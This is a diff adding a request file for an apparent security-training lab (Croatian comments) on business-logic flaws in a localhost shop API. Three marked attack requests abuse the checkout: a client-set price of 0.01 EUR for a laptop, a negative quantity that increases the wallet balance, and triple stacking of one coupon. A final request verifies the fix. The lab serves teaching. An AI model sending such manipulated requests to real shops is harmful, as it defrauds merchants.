@@ -1,0 +1,57 @@
+### =====================================================================
+### Lab10 – A06 Insecure Design: poslovna logika (CWE-840, CWE-20)
+### Upute: docs/labs/lab10-business-logic.md
+### Proizvodi: 1 Laptop 899.00, 2 Slušalice 99.00, 3 Kabel 9.99; kupon AKADEMIJA10 = 10 %
+### =====================================================================
+@host = http://localhost:5080
+@token = ZALIJEPITE_TOKEN_OVDJE
+
+### 1) Prijava kao ana (kopirajte "token" u @token)
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{"username": "ana", "password": "Ana123!"}
+
+### 2) Stanje novčanika – početno 1000.00 EUR
+GET {{host}}/api/lab10/wallet
+Authorization: Bearer {{token}}
+
+### 3) Legitimna kupnja: 2 × kabel (9.99) = 19.98
+POST {{host}}/api/lab10/checkout
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"items": [{"productId": 3, "quantity": 2, "unitPrice": 9.99}], "couponCodes": []}
+
+### 4) NAPAD: klijent sam određuje cijenu – laptop za 0.01 EUR
+POST {{host}}/api/lab10/checkout
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"items": [{"productId": 1, "quantity": 1, "unitPrice": 0.01}], "couponCodes": []}
+
+### 5) NAPAD: negativna količina – stanje novčanika RASTE
+POST {{host}}/api/lab10/checkout
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"items": [{"productId": 1, "quantity": -5, "unitPrice": 899.00}], "couponCodes": []}
+
+### 6) NAPAD: isti kupon tri puta (0.9 × 0.9 × 0.9 = 27,1 % popusta umjesto 10 %)
+POST {{host}}/api/lab10/checkout
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"items": [{"productId": 2, "quantity": 1, "unitPrice": 99.00}], "couponCodes": ["AKADEMIJA10", "AKADEMIJA10", "AKADEMIJA10"]}
+
+### 7) Stanje nakon napada
+GET {{host}}/api/lab10/wallet
+Authorization: Bearer {{token}}
+
+### 8) PROVJERA POPRAVKA: 4) naplaćuje 899.00 (cijena iz baze), 5) i 6) vraćaju 400,
+###    drugi pokušaj s istim kuponom (nakon jedne uspješne uporabe) vraća 400
+POST {{host}}/api/lab10/checkout
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"items": [{"productId": 2, "quantity": 1}], "couponCodes": ["AKADEMIJA10"]}
